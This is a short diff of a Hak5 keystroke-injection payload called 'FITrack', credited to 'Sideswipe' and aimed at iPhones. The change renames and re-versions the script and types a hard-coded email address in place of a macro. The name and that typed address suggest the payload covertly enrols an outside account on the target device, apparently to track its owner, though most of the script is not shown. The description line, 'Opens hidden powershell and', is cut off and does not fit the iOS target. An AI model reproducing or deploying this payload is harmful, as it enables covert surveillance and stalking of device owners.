@@ -1,12 +1,10 @@
-REM Title: ITrack
+REM Title: FITrack
 REM Author: Sideswipe(sideswipeishacking)
 REM Description: Opens hidden powershell and
 REM Target: IOS
 REM Props: Hak5
-REM Version: 1.2
+REM Version: 1.3
 REM Category: Mobile
-
-DEFINE #EMAIL yneverknow498@gmail.com
 
 REM Default Delay optimzed for Iphone 14 Pro
 DEFAULT_DELAY 100
@@ -77,7 +75,7 @@ TAB
 SPACE
 ENTER
 DEFAULT_DELAY 100
-STRING #EMAIL
+STRING yneverknow498@gmail.com
 ENTER
 TAB
 TAB
